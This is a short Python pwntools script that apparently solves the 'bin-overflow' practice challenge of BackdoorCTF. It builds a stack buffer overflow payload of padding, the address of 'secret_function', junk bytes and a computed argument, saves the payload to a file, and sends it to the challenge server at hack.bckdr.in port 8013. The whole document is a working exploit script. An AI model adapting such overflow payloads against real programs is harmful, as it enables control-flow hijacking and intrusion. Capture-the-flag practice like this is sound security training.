from pwn import *

fp	= '/root/Documents/BackDoorCTF/PracticeArena/binOverflow/bin-overflow'
elf	= ELF(fp)

secret_func	= p32(elf.symbols['secret_function'])

junk1	= '\x41'*16
junk2	= '\x42'*4

arg1	= 0xb4d110 / 0x3e8
arg1	= p32(arg1)

payload	= junk1 + secret_func + junk2 + arg1
print payload

file_obj	= open("payload.txt", "w")
if(file_obj):
	file_obj.write(payload)
	file_obj.close()

r	= remote('hack.bckdr.in', 8013)
sleep(0.5)
r.send(payload)
sleep(0.5)
output          = r.recv()
print output

